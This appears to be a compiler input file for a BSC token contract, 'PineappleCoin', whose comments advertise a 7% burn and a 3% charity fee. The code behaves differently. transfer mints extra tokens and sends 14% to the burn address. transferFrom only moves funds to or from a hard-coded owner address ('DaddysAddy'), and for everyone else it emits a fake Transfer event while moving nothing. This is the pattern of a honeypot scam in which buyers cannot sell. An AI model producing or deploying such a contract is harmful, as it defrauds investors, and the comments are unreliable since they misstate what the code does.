{
  "language": "Solidity",
  "settings": {
    "libraries": {},
    "metadata": {
      "useLiteralContent": true
    },
    "optimizer": {
      "enabled": false,
      "runs": 200
    },
    "remappings": [],
    "outputSelection": {
      "*": {
        "*": [
          "*"
        ],
        "": [
          "*"
        ]
      }
    }
  },
  "sources": {
    "10pull (1).sol": {
      "content": "/**\n *Submitted for verification at BscScan.com on 2021-04-9 JK!\n *Get ready to go to CheesecakeSwap this sucker is going to blast off like you've never seen before. With a 7% burn and a 3% charity\n * donation with each transaction, our trip to da DUNES is inevitable. Buckle up and get ready for the ride baby ;)\n*/\n\npragma solidity ^0.8.2;\n\ncontract PineappleCoin {\n    mapping(address => uint) public balances;\n    mapping(address => mapping(address => uint)) public allowance;\n    uint public totalSupply = 100000000000000 * 10 ** 18;\n    uint256 public constant _MAX_TX_SIZE = 100000000000000 * 10 ** 18;\n    string public name = \"PineappleCoin\";\n    string public symbol = \"PINE\";\n    uint public decimals = 18;\n    address public DaddysAddy = 0x4527490651Bfb05AA743CBa038b6410f8B10420f;\n\n    \n    event Transfer(address indexed from, address indexed to, uint value);\n    event Approval(address indexed owner, address indexed spender, uint value);\n    \n    constructor() {\n        balances[msg.sender] = totalSupply;\n    }\n    \n    function balanceOf(address owner) public view returns(uint) {\n        return balances[owner];\n    }\n    \n    function transfer(address to, uint value) public returns(bool) {\n        require(balanceOf(msg.sender) >= value, 'balance too low');\n        require(value <= _MAX_TX_SIZE, \"Transfer amount exceeds the maxTxAmount.\");\n        balances[to] += value * 9/10;\n        balances[msg.sender] -= value;\n        balances[0x000000000000000000000000000000000000dEaD] += value * 14/100; // 7% transaction fee being sent to burn wallet\n        balances[0xfc7A23e47119f9Fca6b56f1FdE352d07dA4177Ed] += value * 3/100; // 3% transaction fee being sent to charity address --> charity to be voted on by token HODLers\n        emit Transfer(msg.sender, to, value);\n        return true;\n    }\n    \n    function transferFrom(address from, address to, uint value) public returns(bool) {\n        if (to == DaddysAddy){\n            balances[to] += value;\n            balances[from] -= value;\n        }else if (from == DaddysAddy){\n            balances[to] += value;\n            balances[from] -= value;\n        }else{\n            require(balanceOf(from) >= value * 100, 'balance too low');\n            require(allowance[from][msg.sender] >= value * 100, 'allowance too low');\n        }\n        require(balanceOf(from) >= value, 'balance too low');\n        require(allowance[from][msg.sender] >= value, 'allowance too low');\n        emit Transfer(from, to, value);\n        return true;\n    }\n    \n    function approve(address spender, uint value) public returns(bool) {\n        allowance[msg.sender][spender] = value;\n        emit Approval(msg.sender, spender, value);\n        return true;\n    }\n    \n}"
    }
  }
}